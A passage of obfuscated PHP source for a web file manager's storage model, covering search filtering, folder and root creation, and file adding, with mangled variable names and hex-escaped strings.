= array(); $åÀ”ñ‹’ = $­š–¯Ğ±[$‘Ñ¬øÂÅ[1988]]; foreach ($µà–”š[$‘Ñ¬øÂÅ[415]] as $¥ÅÎ²Ù¨) { $œÃšÃğŸ = $¥ÅÎ²Ù¨[$‘Ñ¬øÂÅ[32]]; $»ç•÷ÆŠ = str_replace($‘Ñ¬øÂÅ[53], $‘Ñ¬øÂÅ[12], Pinyin::get($œÃšÃğŸ)); if (stripos($œÃšÃğŸ, $åÀ”ñ‹’) !== !1 || stripos($»ç•÷ÆŠ, $åÀ”ñ‹’) !== !1) { $¸™¦ß÷™[] = $¥ÅÎ²Ù¨[$‘Ñ¬øÂÅ[445]]; } } if (!$¸™¦ß÷™) { return; } $Ã•ú‰• = array($‘Ñ¬øÂÅ[470] => array($‘Ñ¬øÂÅ[7], $¸™¦ß÷™), $‘Ñ¬øÂÅ[1696] => 0, $‘Ñ¬øÂÅ[33] => $‘Ñ¬øÂÅ[2010] . $×‡»ôı”); $¥™•ÛÍ¬ = Model($‘Ñ¬øÂÅ[472])->field($‘Ñ¬øÂÅ[86])->where($Ã•ú‰•)->select(); $¥™•ÛÍ¬ = array_to_keyvalue($¥™•ÛÍ¬, $‘Ñ¬øÂÅ[12], $‘Ñ¬øÂÅ[86]); $°õİÂ¿È = array_unique($¥™•ÛÍ¬); $this->_listSearchMerge($ù×†É¡, $­š–¯Ğ±, $£ìÆè±, $°õİÂ¿È); } private function _listSearchMerge(&$‘¹­İ¥„, $€’ïŠŞµ, $Áã»À½Í, $æ²¨×) { $ÓŒ ßõÅ =& $_SERVER[èùÙ¹Ïö]; if (!$æ²¨×) { return; } $ú¦°ĞÈÉ = array_to_keyvalue($‘¹­İ¥„[$ÓŒ ßõÅ[415]], $ÓŒ ßõÅ[12], $ÓŒ ßõÅ[183]); $ÉÙÊôˆ² = array_diff($æ²¨×, $ú¦°ĞÈÉ); if (!$ÉÙÊôˆ²) { return; } $Îú“£©İ = array($ÓŒ ßõÅ[183] => array($ÓŒ ßõÅ[7], $ÉÙÊôˆ²)); $­¬æğ²Ê = $this->field($Áã»À½Í)->where($Îú“£©İ)->select(); if (!$­¬æğ²Ê) { return; } $…í’«É = array(); foreach ($­¬æğ²Ê as $«•ï‡·†) { if ($this->_listSearchFilter($«•ï‡·†, $€’ïŠŞµ)) { $…í’«É[] = $«•ï‡·†; } } $‘¹­İ¥„[$ÓŒ ßõÅ[415]] = array_merge($…í’«É, $‘¹­İ¥„[$ÓŒ ßõÅ[415]]); $‘¹­İ¥„[$ÓŒ ßõÅ[412]][$ÓŒ ßõÅ[413]] += count($…í’«É); } private function _listSearchFilter($³ÆÍÑ, $°¨ŠÉˆš) { $¦ßÙää =& $_SERVER[èùÙ¹Ïö]; $¦«á‡Ìş = $³ÆÍÑ[$¦ßÙää[455]] == $¦ßÙää[90]; if (!strstr($³ÆÍÑ[$¦ßÙää[556]], $¦ßÙää[50] . $°¨ŠÉˆš[$¦ßÙää[182]] . $¦ßÙää[50])) { return !1; } if (isset($°¨ŠÉˆš[$¦ßÙää[456]]) && $°¨ŠÉˆš[$¦ßÙää[456]] != $¦ßÙää[1949]) { if ($°¨ŠÉˆš[$¦ßÙää[456]] == $¦ßÙää[77] && !$¦«á‡Ìş) { return !1; } if ($°¨ŠÉˆš[$¦ßÙää[456]] != $¦ßÙää[77] && $¦«á‡Ìş) { return !1; } if (!strstr($³ÆÍÑ[$¦ßÙää[177]], $¦ßÙää[50] . $°¨ŠÉˆš[$¦ßÙää[456]] . $¦ßÙää[50])) { return !1; } } if (isset($°¨ŠÉˆš[$¦ßÙää[2157]]) && $°¨ŠÉˆš[$¦ßÙää[2157]] < $³ÆÍÑ[$¦ßÙää[78]]) { return !1; } if (isset($°¨ŠÉˆš[$¦ßÙää[2158]]) && $°¨ŠÉˆš[$¦ßÙää[2158]] > $³ÆÍÑ[$¦ßÙää[78]]) { return !1; } if (isset($°¨ŠÉˆš[$¦ßÙää[633]]) && $°¨ŠÉˆš[$¦ßÙää[633]] != $³ÆÍÑ[$¦ßÙää[499]]) { return !1; } return !0; } public function listSearchChildren($ŞÙÑ¼ƒë, $õöıüÎ = 5000) { $ÅÈ¸Ÿ°£ =& $_SERVER[èùÙ¹Ïö]; $ä”Ÿ“Ğú = array(); $Ïş÷àçÒ = $this->sourceInfo($ŞÙÑ¼ƒë); $Œ§Õêä = array($ÅÈ¸Ÿ°£[556] => array($ÅÈ¸Ÿ°£[429], $Ïş÷àçÒ[$ÅÈ¸Ÿ°£[556]] . $Ïş÷àçÒ[$ÅÈ¸Ÿ°£[183]] . $ÅÈ¸Ÿ°£[584])); $¶®à¶ôé = $this->field($ÅÈ¸Ÿ°£[78])->where($Œ§Õêä)->limit($õöıüÎ + 1)->select(); $¢ˆèşÈ˜ = is_array($¶®à¶ôé) ? count($¶®à¶ôé) : 0; if ($¢ˆèşÈ˜ > $õöıüÎ) { return $this->_listSearchChildrenNear($ŞÙÑ¼ƒë, $õöıüÎ); } $¹Û¶ŠÈ¿ = $this->field($ÅÈ¸Ÿ°£[183])->where($Œ§Õêä)->select(); $ä”Ÿ“Ğú = array_to_keyvalue($¹Û¶ŠÈ¿, $ÅÈ¸Ÿ°£[12], $ÅÈ¸Ÿ°£[183]); return $ä”Ÿ“Ğú; } private function _listSearchChildrenNear($ÊÓ‹áí¶, $ÈĞ‡¯—½) { $ãÀÁğæ‘ =& $_SERVER[èùÙ¹Ïö]; $ß¡¹ïš³ = array(); $Ÿæß±š = array($ãÀÁğæ‘[182] => $ÊÓ‹áí¶); $úÜ‡”Ÿû = $this->field($ãÀÁğæ‘[2159])->where($Ÿæß±š)->select(); $Ò×˜óÏ´ = array_to_keyvalue(array_filter_by_field($úÜ‡”Ÿû, $ãÀÁğæ‘[455], $ãÀÁğæ‘[90]), $ãÀÁğæ‘[12], $ãÀÁğæ‘[183]); $ß¡¹ïš³ = array_merge($ß¡¹ïš³, array_to_keyvalue($úÜ‡”Ÿû, $ãÀÁğæ‘[12], $ãÀÁğæ‘[183])); if (!$Ò×˜óÏ´) { return $ß¡¹ïš³; } $Ÿæß±š = array($ãÀÁğæ‘[182] => array($ãÀÁğæ‘[7], $Ò×˜óÏ´)); $úÜ‡”Ÿû = $this->field($ãÀÁğæ‘[2159])->where($Ÿæß±š)->limit($ÈĞ‡¯—½)->select(); $ß¡¹ïš³ = array_merge($ß¡¹ïš³, array_to_keyvalue($úÜ‡”Ÿû, $ãÀÁğæ‘[12], $ãÀÁğæ‘[183])); $ß¡¹ïš³ = array_slice($ß¡¹ïš³, 0, intval($ÈĞ‡¯—½)); return $ß¡¹ïš³; } private function _listSearchBindPinyin($¾›·¥äŸ, &$ õ÷µò«, &$’åŞûÊã) { $Šü²âóñ =& $_SERVER[èùÙ¹Ïö]; if (!isset($¾›·¥äŸ[$Šü²âóñ[1988]]) || !$¾›·¥äŸ[$Šü²âóñ[1988]]) { return; } if (!Input::check($¾›·¥äŸ[$Šü²âóñ[1988]], $Šü²âóñ[364]) || strlen($¾›·¥äŸ[$Šü²âóñ[1988]]) < 2) { return; } $»—•â = "\x4c\x45\x46\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\137\163\157\x75\x72\x63\145\x5f\x6d\x65\164\141\x20\155\145\x74\141\40\x6f\x6e\40\163\x6f\165\x72\x63\x65\x2e\163\x6f\x75\x72\x63\145\x49\104\x20\75\40\155\x65\x74\141\56\163\157\165\162\x63\145\111\104"; $•Â«£ß¯ = array(); $’åŞûÊã = str_replace(array($Šü²âóñ[248], $Šü²âóñ[53], $Šü²âóñ[2160]), $Šü²âóñ[12], $’åŞûÊã); $’åŞûÊã = $Šü²âóñ[481] . str_replace($Šü²âóñ[50], $Šü²âóñ[482], $’åŞûÊã); $öœ—úœã = $ õ÷µò«[$Šü²âóñ[32]]; unset($ õ÷µò«[$Šü²âóñ[32]]); foreach ($ õ÷µò« as $ÃÒˆÓªÖ => $‰Îã´–) { $•Â«£ß¯[$Šü²âóñ[481] . $ÃÒˆÓªÖ] = $‰Îã´–; } foreach ($öœ—úœã as $Íé´ìº¢) { $•Â«£ß¯[] = array($Šü²âóñ[486] => $Íé´ìº¢, $Šü²âóñ[1046] => $Šü²âóñ[1992], array($Šü²âóñ[2161] => $Íé´ìº¢, $Šü²âóñ[2162] => array($Šü²âóñ[7], array($Šü²âóñ[508], $Šü²âóñ[507])))); } $this->join($»—•â); $ õ÷µò« = $•Â«£ß¯; } private function _parseSearchWhere($Í›ŞÅĞü) { $í›»—ÖÛ =& $_SERVER[èùÙ¹Ïö]; $Ÿë­Òªã = array(); if (isset($Í›ŞÅĞü[$í›»—ÖÛ[800]]) && $Í›ŞÅĞü[$í›»—ÖÛ[800]]) { $Ÿë­Òªã[$í›»—ÖÛ[87]] = array($í›»—ÖÛ[2163], $Í›ŞÅĞü[$í›»—ÖÛ[800]]); } if (isset($Í›ŞÅĞü[$í›»—ÖÛ[801]]) && $Í›ŞÅĞü[$í›»—ÖÛ[801]]) { $ë ¸²á» = array($í›»—ÖÛ[2164], $Í›ŞÅĞü[$í›»—ÖÛ[801]]); if ($Ÿë­Òªã[$í›»—ÖÛ[87]]) { $Ÿë­Òªã[$í›»—ÖÛ[87]] = array($Ÿë­Òªã[$í›»—ÖÛ[87]], $ë ¸²á», $í›»—ÖÛ[2165]); } else { $Ÿë­Òªã[$í›»—ÖÛ[87]] = $ë ¸²á»; } } if (isset($Í›ŞÅĞü[$í›»—ÖÛ[2157]]) && $Í›ŞÅĞü[$í›»—ÖÛ[2157]] > 0) { $Ÿë­Òªã[$í›»—ÖÛ[78]] = array($í›»—ÖÛ[2163], $Í›ŞÅĞü[$í›»—ÖÛ[2157]]); } if (isset($Í›ŞÅĞü[$í›»—ÖÛ[2158]]) && $Í›ŞÅĞü[$í›»—ÖÛ[2158]]) { $ë ¸²á» = array($í›»—ÖÛ[2164], $Í›ŞÅĞü[$í›»—ÖÛ[2158]]); if ($Ÿë­Òªã[$í›»—ÖÛ[78]]) { $Ÿë­Òªã[$í›»—ÖÛ[78]] = array($Ÿë­Òªã[$í›»—ÖÛ[78]], $ë ¸²á», $í›»—ÖÛ[2165]); } else { $Ÿë­Òªã[$í›»—ÖÛ[78]] = $ë ¸²á»; } } if (isset($Í›ŞÅĞü[$í›»—ÖÛ[633]]) && $Í›ŞÅĞü[$í›»—ÖÛ[633]]) { $Ÿë­Òªã[] = array($í›»—ÖÛ[499] => $Í›ŞÅĞü[$í›»—ÖÛ[633]], $í›»—ÖÛ[497] => $Í›ŞÅĞü[$í›»—ÖÛ[633]], $í›»—ÖÛ[1046] => $í›»—ÖÛ[1992]); } if (isset($Í›ŞÅĞü[$í›»—ÖÛ[456]]) && $Í›ŞÅĞü[$í›»—ÖÛ[456]]) { $ø‘Å‰îû = $Í›ŞÅĞü[$í›»—ÖÛ[456]]; if ($ø‘Å‰îû == $í›»—ÖÛ[77]) { $Ÿë­Òªã[$í›»—ÖÛ[455]] = 1; } else { if ($ø‘Å‰îû == $í›»—ÖÛ[2166]) { $Ÿë­Òªã[$í›»—ÖÛ[455]] = 0; } else { if ($ø‘Å‰îû) { $ø‘Å‰îû = is_array($ø‘Å‰îû) ? $ø‘Å‰îû : explode($í›»—ÖÛ[50], $ø‘Å‰îû); $Ÿë­Òªã[$í›»—ÖÛ[456]] = array($í›»—ÖÛ[462], $ø‘Å‰îû); $Ÿë­Òªã[$í›»—ÖÛ[455]] = 0; } } } } $this->_parseSearchParent($Í›ŞÅĞü, $Ÿë­Òªã); if (isset($Í›ŞÅĞü[$í›»—ÖÛ[1988]]) && trim($Í›ŞÅĞü[$í›»—ÖÛ[1988]])) { $€š¾Ç†Â = trim($Í›ŞÅĞü[$í›»—ÖÛ[1988]]); $»Ú¬Çëø = explode($í›»—ÖÛ[53], $€š¾Ç†Â); if (strlen($€š¾Ç†Â) > 2 && (substr($€š¾Ç†Â, 0, 1) == $í›»—ÖÛ[120] && substr($€š¾Ç†Â, -1) == $í›»—ÖÛ[120]) || substr($€š¾Ç†Â, 0, 1) == $í›»—ÖÛ[58] && substr($€š¾Ç†Â, -1) == $í›»—ÖÛ[58]) { $€š¾Ç†Â = substr($€š¾Ç†Â, 1, -1); $»Ú¬Çëø = array($€š¾Ç†Â); } $Ÿë­Òªã[$í›»—ÖÛ[32]] = array(array($í›»—ÖÛ[583], $í›»—ÖÛ[1990] . $€š¾Ç†Â . $í›»—ÖÛ[1990])); if (count($»Ú¬Çëø) > 1) { $Ÿë­Òªã[$í›»—ÖÛ[32]] = array(); foreach ($»Ú¬Çëø as $ãÚÚ‚Öƒ) { if (!trim($ãÚÚ‚Öƒ)) { continue; } $Ÿë­Òªã[$í›»—ÖÛ[32]][] = array($í›»—ÖÛ[583], $í›»—ÖÛ[1990] . trim($ãÚÚ‚Öƒ) . $í›»—ÖÛ[1990]); } } } return $Ÿë­Òªã; } private function _parseSearchParent($üÏà¬¡†, &$ú”ÚÌ©Æ) { $½÷È©Ì“ =& $_SERVER[èùÙ¹Ïö]; if (!isset($üÏà¬¡†[$½÷È©Ì“[182]]) || !$üÏà¬¡†[$½÷È©Ì“[182]]) { return; } $¼›£¸äÖ = $this->pathInfo($üÏà¬¡†[$½÷È©Ì“[182]]); $ãÄóëÄÂ = $¼›£¸äÖ[$½÷È©Ì“[182]] . $½÷È©Ì“[12] === $½÷È©Ì“[214]; $ëÇÒëË² = $¼›£¸äÖ[$½÷È©Ì“[180]] == $½÷È©Ì“[550]; if ($¼›£¸äÖ[$½÷È©Ì“[567]] == $½÷È©Ì“[568]) { $Ú¶àŠ­ = $this->sourceInfo($üÏà¬¡†[$½÷È©Ì“[182]]); $¼›£¸äÖ[$½÷È©Ì“[556]] = $Ú¶àŠ­[$½÷È©Ì“[556]]; } $ú”ÚÌ©Æ[$½÷È©Ì“[623]] = array($½÷È©Ì“[583], $¼›£¸äÖ[$½÷È©Ì“[556]] . $üÏà¬¡†[$½÷È©Ì“[182]] . $½÷È©Ì“[584]); $É›—¯½À = isset($üÏà¬¡†[$½÷È©Ì“[1853]]) && in_array($½÷È©Ì“[550], $üÏà¬¡†[$½÷È©Ì“[1853]]); if (!$É›—¯½À || !$ëÇÒëË² || !$ãÄóëÄÂ || !$¼›£¸äÖ[$½÷È©Ì“[457]]) { return; } if (!AuthModel::authCheckRoot($¼›£¸äÖ[$½÷È©Ì“[457]][$½÷È©Ì“[458]])) { return; } $«Ã²½Œ‚ = $¼›£¸äÖ[$½÷È©Ì“[541]] . $½÷È©Ì“[12]; if ($«Ã²½Œ‚ == $½÷È©Ì“[90]) { unset($ú”ÚÌ©Æ[$½÷È©Ì“[623]]); $ú”ÚÌ©Æ[$½÷È©Ì“[180]] = self::TYPE_GROUP; return; } $Ğ’í¯³× = Model($½÷È©Ì“[557])->groupChildrenAll($«Ã²½Œ‚); $Šõ÷“Òö = count($Ğ’í¯³×); if ($Šõ÷“Òö <= 1) { return; } $ç¯Â›¤³ = array($½÷È©Ì“[182] => 0, $½÷È©Ì“[180] => self::TYPE_GROUP, $½÷È©Ì“[541] => array($½÷È©Ì“[7], $Ğ’í¯³×)); $¢ŸïÒ = $this->field($½÷È©Ì“[2167])->where($ç¯Â›¤³)->limit($Šõ÷“Òö)->select(); $ú”ÚÌ©Æ[$½÷È©Ì“[623]] = array(); foreach ($¢ŸïÒ as $²„™´íå) { $ú”ÚÌ©Æ[$½÷È©Ì“[623]][] = array($½÷È©Ì“[583], $½÷È©Ì“[566] . $²„™´íå[$½÷È©Ì“[183]] . $½÷È©Ì“[584]); } $ú”ÚÌ©Æ[$½÷È©Ì“[623]][] = $½÷È©Ì“[1992]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($óÖèâàã) { $Óâ¢»±ä =& $_SERVER[èùÙ¹Ïö]; $°ô²™‡Ş = Model($Óâ¢»±ä[549])->where(array($Óâ¢»±ä[1687] => $óÖèâàã))->find(); $èÔÜ™ì = $this->_mkdirRoot(SourceModel::TYPE_USER, $óÖèâàã, $°ô²™‡Ş[$Óâ¢»±ä[32]]); $this->userDesktopAdd($èÔÜ™ì); return $èÔÜ™ì; } public function userDesktopAdd($—÷„¦³) { $ğ÷“âµ‡ =& $_SERVER[èùÙ¹Ïö]; $ÛŒÁôÑ = LNG($ğ÷“âµ‡[2168]); $°è¹ªıê = $this->mkdir($—÷„¦³, $ÛŒÁôÑ); $this->metaSet($°è¹ªıê, $ğ÷“âµ‡[2169], $ğ÷“âµ‡[90]); $this->metaSet($—÷„¦³, $ğ÷“âµ‡[2170], $°è¹ªıê); } public function userPathSafeAdd($’ÈÂÌÒ÷) { $ş¡ÄÍ·¶ =& $_SERVER[èùÙ¹Ïö]; $‡¯ş„×Â = Model($ş¡ÄÍ·¶[549])->getInfoFull($’ÈÂÌÒ÷); if (!$‡¯ş„×Â) { return !1; } if (_get($‡¯ş„×Â, $ş¡ÄÍ·¶[571])) { return $‡¯ş„×Â[$ş¡ÄÍ·¶[509]][$ş¡ÄÍ·¶[2171]]; } $êöÀ„°î = $this->_mkdirRoot(SourceModel::TYPE_USER, $’ÈÂÌÒ÷, $ş¡ÄÍ·¶[2172], $ş¡ÄÍ·¶[476]); Model($ş¡ÄÍ·¶[549])->metaSet($’ÈÂÌÒ÷, $ş¡ÄÍ·¶[2171], $êöÀ„°î); $this->metaSet($êöÀ„°î, $ş¡ÄÍ·¶[2173], $’ÈÂÌÒ÷); return $êöÀ„°î; } public function groupRootAdd($½£Üí÷ê) { $ÀÎˆ€˜× =& $_SERVER[èùÙ¹Ïö]; $ñİ¹­Ì = Model($ÀÎˆ€˜×[557])->where(array($ÀÎˆ€˜×[1982] => $½£Üí÷ê))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $½£Üí÷ê, $ñİ¹­Ì[$ÀÎˆ€˜×[32]]); } public function systemRootPathAdd($ÖšÙÄ¶ë) { if ($ÖšÙÄ¶ë != $_SERVER[èùÙ¹Ïö][577]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÖšÙÄ¶ë); } public function userRootRemove($øÆÎÅ±î) { $Ëã¢¢¿¢ = $this->targetSourceRoot(SourceModel::TYPE_USER, $øÆÎÅ±î, !0); foreach ($Ëã¢¢¿¢ as $ªí¤ÌøÊ) { if (!$ªí¤ÌøÊ) { continue; } $this->remove($ªí¤ÌøÊ[$_SERVER[èùÙ¹Ïö][183]], !1); } } public function groupRootRemove($½ëò¨ğ¶) { $û”Ä™å¡ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $½ëò¨ğ¶); if (!$û”Ä™å¡) { return; } $this->remove($û”Ä™å¡[$_SERVER[èùÙ¹Ïö][183]], !1); } private function _mkdirRoot($¬øÀÉÓ, $éÈ¥é•ü, $öïğüÃ, $è¥ŒĞØ = '') { $£¯ÙŞû£ =& $_SERVER[èùÙ¹Ïö]; $‘²‚µü³ = defined($£¯ÙŞû£[2116]) ? USER_ID : 0; $Úã¢ğÀ = array($£¯ÙŞû£[447] => 0, $£¯ÙŞû£[619] => $¬øÀÉÓ, $£¯ÙŞû£[620] => $éÈ¥é•ü, $£¯ÙŞû£[617] => 1, $£¯ÙŞû£[621] => $‘²‚µü³, $£¯ÙŞû£[622] => $‘²‚µü³, $£¯ÙŞû£[618] => $è¥ŒĞØ, $£¯ÙŞû£[623] => $£¯ÙŞû£[566], $£¯ÙŞû£[474] => 0, $£¯ÙŞû£[588] => 0, $£¯ÙŞû£[512] => 0, $£¯ÙŞû£[624] => $£¯ÙŞû£[12]); if ($ó³Óäù‚ = $this->where($Úã¢ğÀ)->find()) { return $ó³Óäù‚[$£¯ÙŞû£[183]]; } $•ß²ôÒ‰ = "\x4d\157\144\145\x6c\x53\157\165\162\143\145\56\x6d\153\x64\151\x72\122\x6f\x6f\x74\56{$¬øÀÉÓ}\56{$éÈ¥é•ü}\56" . $öïğüÃ; CacheLock::lock($•ß²ôÒ‰); $Úã¢ğÀ[$£¯ÙŞû£[32]] = $öïğüÃ; $ò‡Ğ×˜Î = $this->add($Úã¢ğÀ); $Ñ“ƒé•‡ = array($£¯ÙŞû£[625] => short_id($ò‡Ğ×˜Î)); $this->where(array($£¯ÙŞû£[461] => $ò‡Ğ×˜Î))->save($Ñ“ƒé•‡); CacheLock::unlock($•ß²ôÒ‰); return $ò‡Ğ×˜Î; } private function targetSourceRoot($Ü£Ş¢ÍĞ, $±Ëæ¦Á», $²ç­¡ï‘ = false) { $¸£„œĞ‘ =& $_SERVER[èùÙ¹Ïö]; $€®‡×… = array($¸£„œĞ‘[447] => 0, $¸£„œĞ‘[619] => $Ü£Ş¢ÍĞ, $¸£„œĞ‘[620] => $±Ëæ¦Á»); if ($²ç­¡ï‘) { $×¿ÕãÙ = $this->where($€®‡×…)->select(); return $×¿ÕãÙ ? $×¿ÕãÙ : array(); } $¿ôí = $this->where($€®‡×…)->find(); return $¿ôí ? $¿ôí : array(); } public function sourceRootGroup($‹¾öÚ‰ß) { $­ÙŒ‹ =& $_SERVER[èùÙ¹Ïö]; if (is_string($‹¾öÚ‰ß)) { $‹¾öÚ‰ß = array($‹¾öÚ‰ß); } $÷ãåÄÄ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $‹¾öÚ‰ß, $­ÙŒ‹[205]); $Ã´¾ûı = array($­ÙŒ‹[415] => $÷ãåÄÄ, $­ÙŒ‹[412] => array($­ÙŒ‹[798] => count($‹¾öÚ‰ß))); $this->_listDataApply($Ã´¾ûı[$­ÙŒ‹[415]]); $this->_listMake($Ã´¾ûı); return array_to_keyvalue($Ã´¾ûı[$­ÙŒ‹[84]], $­ÙŒ‹[541]); } public function mkfile($—œô¡ûã, $ñĞ˜ßœº, $º©çı«¶ = '', $ç§€ÆŒ— = REPEAT_RENAME) { $ÌÉö†è¥ =& $_SERVER[èùÙ¹Ïö]; $üÄû = Model($ÌÉö†è¥[645])->addFileByContent($º©çı«¶, $ñĞ˜ßœº); return $this->_createFileCall($—œô¡ûã, $ñĞ˜ßœº, $üÄû, $ç§€ÆŒ—, $ÌÉö†è¥[1391]); } public function addFile($ç“§’ü£, $¹áÙ÷Ïş, $ŒÀŞ³, $¨’°Å‡ = false, $‹¥ƒüøã = REPEAT_RENAME) { $ªúŸ§òÒ = Model($_SERVER[èùÙ¹Ïö][645])->addFile($¹áÙ÷Ïş, $ŒÀŞ³, $¨’°Å‡); return $this->_createFileCall($ç“§’ü£, $ŒÀŞ³, $ªúŸ§òÒ, $‹¥ƒüøã); } public function addFileByFileID($ãå¥ùÏÛ, $ÛÏ®œ¼², $ß«§½Ñ, $ÏÈú²¹“ = REPEAT_RENAME) { $Óø¡îõÃ =& $_SERVER[èùÙ¹Ïö]; $ÂÎ Š“¥ = Model($Óø¡îõÃ[645])->find($ÛÏ®œ¼²); Model($Óø¡îõÃ[645])->linkAdd($ÛÏ®œ¼²); return $this->_createFileCall($ãå¥ùÏÛ, $ß«§½Ñ, $ÂÎ Š“¥, $ÏÈú²¹“); } public function addFileByRemote($ÌØÏ¢ğÙ, $¡æ…“È®, $ıÄ½úõ®, $Ú÷ö¦ö® = array(), $áîæª° = REPEAT_RENAME) { $ıê©¢—è = Model($_SERVER[èùÙ¹Ïö][645])->addFileByRemote($¡æ…“È®, $ıÄ½úõ®, $Ú÷ö¦ö®); return $this->_createFileCall($ÌØÏ¢ğÙ, $ıÄ½úõ®, $ıê©¢—è, $áîæª°); } private function _createFileCall($¸ğåÛ×Ù, $§æÇÖ‚á, $úûïŠ³, $›ÜıÅÅÓ, $±£„˜Ç = "\165\160\x6c\x6f\141\x64") { $íÆùŞé =& $_SERVER[èùÙ¹Ïö]; $Û·ñİã = !1; $this->setMasterDB(); $this->lockWriteStart($¸ğåÛ×Ù, $§æÇÖ‚á); $…¾åÌÔí = $this->fileNameExist($¸ğåÛ×Ù, $§æÇÖ‚á); $õ¢éÖÀğ = $this->_createFile($¸ğåÛ×Ù, $§æÇÖ‚á, $úûïŠ³, $›ÜıÅÅÓ, $Û·ñİã); if (!$Û·ñİã) { Model($íÆùŞé[514])->remove($úûïŠ³[$íÆùŞé[511]]); } if ($Û·ñİã && $õ¢éÖÀğ && $õ¢éÖÀğ != $…¾åÌÔí) { Model($íÆùŞé[2141])->eventCreate($õ¢éÖÀğ, $±£„˜Ç); } $this->lockWriteEnd($¸ğåÛ×Ù, $§æÇÖ‚á); return $õ¢éÖÀğ; } public function mkdir($øà¾™», $Ù¯¢çö, $ƒ¬Ò§‡ë = REPEAT_SKIP) { $Ë¹íæ÷ =& $_SERVER[èùÙ¹Ïö]; $this->setMasterDB(); $ˆí¦½šª = $this->sourceInfo($øà¾™»); if (!$ˆí¦½šª) { return !1; } $this->lockWriteStart($øà¾™», $Ù¯¢çö); if ($ƒ¬Ò§‡ë !== !1) { $ã™¡§°­ = $this->fileNameExist($øà¾™», $Ù¯¢çö); if ($ã™¡§°­ && $ƒ¬Ò§‡ë != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($øà¾™», $Ù¯¢çö); return $ã™¡§°­; } $Ù¯¢çö = $this->fileNameAuto($øà¾™», $Ù¯¢çö, $ƒ¬Ò§‡ë); } $ï½Şå‰ı = array($Ë¹íæ÷[617] => 1, $Ë¹íæ÷[464] => $Ù¯¢çö, $Ë¹íæ÷[618] => $Ë¹íæ÷[12], $Ë¹íæ÷[512] => 0, $Ë¹íæ÷[588] => 0); $Œ‚Ş„ƒ = $this->_addSource($ï½Şå‰ı, $ˆí¦½šª); Model($Ë¹íæ÷[2141])->eventCreate($Œ‚Ş„ƒ, $Ë¹íæ÷[1392]); $this->lockWriteEnd($øà¾™», $Ù¯¢çö); return $Œ‚Ş„ƒ; } public function listSourceRoot($Ò×ÓÈ¾Š, $Ï„Ù˜Å‡, $Ş¢§ğ”Á = "\x73\x6f\x75\162\143\x65\111\x44\x2c\x74\x61\162\147\x65\164\111\104\x2c\163\151\172\x65") { $ãÈ€ÇÇĞ =& $_SERVER[èùÙ¹Ïö]; $„íÚ¤ = $ãÈ€ÇÇĞ[424]; $Ï¶ÄºåØ = array(); $‰ûñõŞŸ = 1024 * 50; $¼İÕòÍÅ = is_array($¼İÕòÍÅ) ? $¼İÕòÍÅ : array(); $¾÷¢—ã = count($Ï„Ù˜Å‡); $È£‘Ì‡ = $this->tablePrefix . $ãÈ€ÇÇĞ[2174]; for ($´’Óø›” = 0; $´’Óø›” < $¾÷¢—ã; $´’Óø›”++) { $éÊÁ˜©“ = $Ï„Ù˜Å‡[$´’Óø›”]; $„íÚ¤ .= "\x53\105\x4c\105\x43\x54\40\52\x20\x46\x52\x4f\x4d\x20\50\x53\105\x4c\x45\x43\124\x20{$Ş¢§ğ”Á}\40\106\122\117\x4d\40\x60{$È£‘Ì‡}\140\x20\127\x48\105\x52\x45\x20"; $„íÚ¤ .= "\140\x70\x61\162\x65\x6e\x74\x49\104\140\x3d\x30\x20\101\x4e\104\x20\x60\x74\141\x72\x67\x65\x74\111\104\140\x3d{$éÊÁ˜©“}\x20\101\x4e\104\x20\x60\x74\141\x72\x67\x65\x74\x54\171\160\x65\140\75{$Ò×ÓÈ¾Š}\x20\x61\156\x64\x20\146\x69\154\x65\124\171\160\x65\x3d\x27\x27\x20\x6c\151\155\x69\164\40\61\51\40\x61\163\40\x74\x62\137{$´’Óø›”}\x20\125\x4e\111\x4f\x4e\40\x41\114\x4c\x20"; if ((strlen($„íÚ¤) >= $‰ûñõŞŸ || $´’Óø›” == $¾÷¢—ã - 1) && $„íÚ¤) { $„íÚ¤ = substr($„íÚ¤, 0, -strlen($ãÈ€ÇÇĞ[1084])); $öíèÙË« = $this->query($„íÚ¤); $„íÚ¤ = $ãÈ€ÇÇĞ[12]; $Ï¶ÄºåØ = array_merge($Ï¶ÄºåØ, $öíèÙË«); } } return $Ï¶ÄºåØ; } private function _createFile($¼á—Åìï, $é…‰¸™¤, $ŠÄî÷íÏ, $ºÔûÊÄ¹, &$äíÉºË·) { $–Ë€º¨ã =& $_SERVER[èùÙ¹Ïö]; $¤±“¹©» = $this->sourceInfo($¼á—Åìï); if (!$ŠÄî÷íÏ || !$¤±“¹©») { return !1; } if ($ºÔûÊÄ¹ !== !1) { $¥ôîÛÎˆ = $this->fileNameExist($¼á—Åìï, $é…‰¸™¤); } $äíÉºË· = !0; if ($ºÔûÊÄ¹ && $¥ôîÛÎˆ) { if ($ºÔûÊÄ¹ == REPEAT_SKIP) { $äíÉºË· = !1; return $¥ôîÛÎˆ; } else { if ($ºÔûÊÄ¹ == REPEAT_REPLACE) { $¨ìùÔ¾« = $this->sourceInfo($¥ôîÛÎˆ); $‰ıÃÔ¿ = $this->fileHistory($¨ìùÔ¾«, $ŠÄî÷íÏ[$–Ë€º¨ã[511]], $ŠÄî÷íÏ[$–Ë€º¨ã[78]]); if (!$‰ıÃÔ¿) { $äíÉºË· = !1; } else { $this->folderSizeReset($¼á—Åìï); } return $¥ôîÛÎˆ; } else { $é…‰¸™¤ = $this->fileNameAuto($¼á—Åìï, $é…‰¸™¤, $ºÔûÊÄ¹, !1); } } } $şÒ‹Öø = array($–Ë€º¨ã[617] => 0, $–Ë€º¨ã[464] => $é…‰¸™¤, $–Ë€º¨ã[618] => substr(get_path_ext($é…‰¸™¤), 0, 10), $–Ë€º¨ã[512] => $ŠÄî÷íÏ[$–Ë€º¨ã[511]], $–Ë€º¨ã[588] => $ŠÄî÷íÏ[$–Ë€º¨ã[78]]); $í¸Ù•Ğ = $this->_addSource($şÒ‹Öø, $¤±“¹©»); $this->folderSizeReset($¼á—Åìï, intval($şÒ‹Öø[$–Ë€º¨ã[78]])); return $í¸Ù•Ğ; } protected function fileHistory($ñÁ·å¿Ø, $¶€‰˜Ã¤, 